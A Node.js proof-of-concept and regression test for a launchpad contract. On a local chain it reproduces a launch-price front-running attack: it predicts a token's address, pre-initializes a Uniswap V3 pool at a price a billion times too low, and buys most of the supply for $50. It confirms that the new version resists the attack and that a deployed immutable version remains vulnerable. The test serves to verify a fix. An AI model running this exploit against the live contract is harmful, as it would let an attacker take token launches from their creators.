// Proof-of-concept / regression test for launch-price front-running.
//
//   node scripts/compile.js && node scripts/test-launch-frontrun.js
//
// THE ATTACK
// `createAndInitializePoolIfNecessary` is a no-op on price when the pool
// already exists AND is initialized. The launchpad then reads slot0().tick
// back and anchors the whole 1B-supply position to it. So whoever initializes
// the pool first chooses the launch price, not startPrice*1e18.
//
// The token address is predictable: `new MemeToken20(...)` is plain CREATE and
// the launchpad performs no other CREATE, so the address is a pure function of
// (launchpad, nonce). A V3 pool can be created and initialized for an address
// that has no code yet, because the factory only checks ordering and fee tier.
//
// Result: an attacker anchors a victim's launch nine orders of magnitude below
// the intended price and buys the supply for pennies.
//
// This file exists to make the fix verifiable, and to check whether the same
// hole is live in the deployed InstantLaunchpad.
const path = require("path");
const ganache = require("ganache");
const { ethers } = require("ethers");

const build = (n) => require(path.join(__dirname, "..", "build", `${n}.json`));
const uni = (p) => require(p);
const E = (v) => ethers.parseEther(String(v));
const U = (v) => ethers.parseUnits(String(v), 6);

let passed = 0, failed = 0;
function check(cond, name, detail) {
  if (cond) { passed++; console.log(`  ok  ${name}`); }
  else { failed++; console.log(`FAIL  ${name}${detail ? "\n        " + detail : ""}`); }
}

const NPM_ABI = [
  "function createAndInitializePoolIfNecessary(address token0, address token1, uint24 fee, uint160 sqrtPriceX96) payable returns (address)",
];
const POOL_ABI = ["function slot0() view returns (uint160 sqrtPriceX96, int24 tick, uint16, uint16, uint16, uint8, bool)"];
const ROUTER02_ABI = [
  "function exactInputSingle((address tokenIn, address tokenOut, uint24 fee, address recipient, uint256 amountIn, uint256 amountOutMinimum, uint160 sqrtPriceLimitX96)) payable returns (uint256)",
];

// sqrt(num/den) in Q96, matching the launchpad's own helper
function sqrtRatioX96(num, den) {
  const x = (num << 96n) / den;
  if (x === 0n) return 0n;
  let z = (x + 1n) / 2n, y = x;
  while (z < y) { y = z; z = (x / z + z) / 2n; }
  return y << 48n;
}

async function scenario(padArtifact, label) {
  console.log(`\n=== ${label} ===`);
  const provider = new ethers.BrowserProvider(
    ganache.provider({ logging: { quiet: true }, wallet: { defaultBalance: 1000000 },
      miner: { blockGasLimit: "0x1C9C380" } })
  );
  const [deployer, feeRcpt, victim, attacker] =
    await Promise.all([0, 1, 2, 3].map((i) => provider.getSigner(i)));

  const usdtArt = build("MockUSDT0");
  const usdt = await new ethers.ContractFactory(usdtArt.abi, usdtArt.bytecode, deployer).deploy();
  await usdt.waitForDeployment();
  const usdtAddr = await usdt.getAddress();

  const facArt = uni("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
  const factory = await new ethers.ContractFactory(facArt.abi, facArt.bytecode, deployer).deploy();
  await factory.waitForDeployment();

  const npmArt = uni("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
  const npmC = await new ethers.ContractFactory(npmArt.abi, npmArt.bytecode, deployer).deploy(
    await factory.getAddress(), usdtAddr, deployer.address);
  await npmC.waitForDeployment();
  const npmAddr = await npmC.getAddress();

  const r02Art = uni("@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json");
  const router = await new ethers.ContractFactory(r02Art.abi, r02Art.bytecode, deployer).deploy(
    ethers.ZeroAddress, await factory.getAddress(), npmAddr, usdtAddr);
  await router.waitForDeployment();
  const routerAddr = await router.getAddress();

  const START_PRICE = 3_000_000_000_000n; // 0.000003 -> $3,000 start mcap
  const isV2 = padArtifact === "ArcLaunchpad";
  const args = isV2
    ? [npmAddr, routerAddr, usdtAddr, feeRcpt.address, feeRcpt.address, E(1), 7000n, 8000n, START_PRICE, ethers.ZeroAddress, 0]
    : [npmAddr, routerAddr, usdtAddr, feeRcpt.address, E(1), 9000n, START_PRICE, ethers.ZeroAddress, 0];
  const padArt = build(padArtifact);
  const pad = await new ethers.ContractFactory(padArt.abi, padArt.bytecode, deployer).deploy(...args);
  await pad.waitForDeployment();
  const padAddr = await pad.getAddress();

  // ---- attacker predicts the victim's token address.
  // v1 uses plain CREATE, so the address is (launchpad, nonce) and globally
  // unique. v2 uses CREATE2, so the attacker must know the salt; we hand it to
  // them deliberately, which is the strongest case they could ever have.
  const SALT = ethers.id("poisoned-salt");
  let predicted;
  if (isV2) {
    // Asked of the contract, not derived from build/MemeToken20.json. That
    // artifact is written twice (InstantLaunchpad and ArcLaunchpad both declare
    // the type) and solc's per-source metadata hash makes the two creation
    // codes differ, so an artifact-derived CREATE2 address is wrong roughly
    // half the time depending on compile order.
    predicted = await pad.predictToken(
      await victim.getAddress(), SALT, "VICTIM", "VICTIM", "ipfs://x");
    console.log(`      CREATE2 with a known salt -> predicted token ${predicted}`);
  } else {
    const nonce = await provider.getTransactionCount(padAddr);
    predicted = ethers.getCreateAddress({ from: padAddr, nonce });
    console.log(`      launchpad nonce ${nonce} -> predicted token ${predicted}`);
  }

  // ---- attacker pre-creates the pool at a price 1e9x below intended
  const tokenIs0 = BigInt(predicted) < BigInt(usdtAddr);
  const [t0, t1] = tokenIs0 ? [predicted, usdtAddr] : [usdtAddr, predicted];
  const EVIL = START_PRICE / 1_000_000_000n;   // token priced ~1e-15 instead of 3e-6
  const evilSqrt = tokenIs0 ? sqrtRatioX96(EVIL, 10n ** 30n) : sqrtRatioX96(10n ** 30n, EVIL);
  const npmA = new ethers.Contract(npmAddr, NPM_ABI, attacker);
  await (await npmA.createAndInitializePoolIfNecessary(t0, t1, 10000, evilSqrt, { gasLimit: 8_000_000 })).wait();
  const poolAddr = await new ethers.Contract(await factory.getAddress(),
    ["function getPool(address,address,uint24) view returns (address)"], provider).getPool(t0, t1, 10000);
  const before = await new ethers.Contract(poolAddr, POOL_ABI, provider).slot0();
  console.log(`      attacker initialized pool ${poolAddr} at tick ${before.tick}`);

  // ---- victim launches, expecting the standard $3,000 start
  let launched = null, reverted = false;
  try {
    const tx = isV2
      ? await pad.connect(victim).launchWithSalt("VICTIM", "VICTIM", "ipfs://x", 0n, SALT,
          { value: E(1), gasLimit: 12_000_000 })
      : await pad.connect(victim).launch("VICTIM", "VICTIM", "ipfs://x", 0n,
          { value: E(1), gasLimit: 12_000_000 });
    const rc = await tx.wait();
    if (rc.status === 0) reverted = true;
    else {
      const ev = rc.logs.map((l) => { try { return pad.interface.parseLog(l); } catch { return null; } })
                        .find((x) => x && x.name === "TokenLaunched");
      launched = ev.args.token;
    }
  } catch { reverted = true; }

  if (reverted) {
    console.log("      victim launch REVERTED on the poisoned pool");
    check(isV2, `${label}: pre-initialized pool is rejected`,
      isV2 ? "" : "v1 was expected to be vulnerable here, not to revert");
    return;
  }

  check(launched.toLowerCase() === predicted.toLowerCase(),
    `${label}: token landed on the predicted address`, `got ${launched}`);

  // ---- how much of the supply can the attacker now buy for $50?
  await (await usdt.connect(attacker).approve(routerAddr, U(1_000_000))).wait();
  const rx = new ethers.Contract(routerAddr, ROUTER02_ABI, attacker);
  await (await rx.exactInputSingle({
    tokenIn: usdtAddr, tokenOut: launched, fee: 10000, recipient: await attacker.getAddress(),
    amountIn: U(50), amountOutMinimum: 0, sqrtPriceLimitX96: 0,
  }, { gasLimit: 8_000_000 })).wait();

  const tok = new ethers.Contract(launched, build("MemeToken20").abi, provider);
  const got = await tok.balanceOf(await attacker.getAddress());
  const pct = Number(ethers.formatEther(got)) / 1e9 * 100;
  console.log(`      attacker spent $50 and received ${ethers.formatEther(got)} tokens (${pct.toFixed(2)}% of supply)`);

  if (isV2) {
    check(pct < 5, `${label}: $50 cannot buy a meaningful share of supply`,
      `attacker took ${pct.toFixed(2)}% of supply for $50 — launch price was hijacked`);
  } else {
    // Asserting the vulnerability rather than the fix. InstantLaunchpad is
    // immutable and live on Stable; this records the exposure so the test
    // starts failing the day it is ever migrated or patched.
    check(pct > 50,
      `${label}: KNOWN VULNERABLE, attack still reproduces (immutable, live on Stable)`,
      `expected the attack to succeed against v1; it took only ${pct.toFixed(2)}%`);
  }
}

async function main() {
  console.log("Launch-price front-running: can a third party choose someone else's launch price?");
  await scenario("ArcLaunchpad", "ArcLaunchpad (v2, new)");
  await scenario("InstantLaunchpad", "InstantLaunchpad (repo source, mirrors Stable)");
  console.log(`\n${passed} passed, ${failed} failed\n`);
  process.exit(failed ? 1 : 0);
}

main().catch((e) => { console.error(e); process.exit(1); });
